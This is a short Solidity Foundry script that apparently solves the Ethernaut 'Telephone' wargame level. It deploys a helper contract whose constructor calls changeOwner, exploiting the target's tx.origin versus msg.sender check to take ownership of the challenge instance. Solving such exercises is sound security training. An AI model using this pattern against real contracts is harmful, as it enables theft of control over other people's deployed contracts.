// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;


import{Script,console} from "forge-std/Script.sol";
import{Telephone} from "../src/Level4.sol";


//this contract will be the msg.sender for the telephone contract
contract Helper{
    constructor(Telephone _telephone,address _newOwner){
        _telephone.changeOwner(_newOwner);
    }
}
contract Level4 is Script{
    Telephone instance=Telephone(0x93DAb0057578974b18Bb3A44A8d9444651f63d88);
    function run() public{
            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
            new Helper(instance,vm.envAddress("MY_ADDRESS"));
            vm.stopBroadcast();
    }
}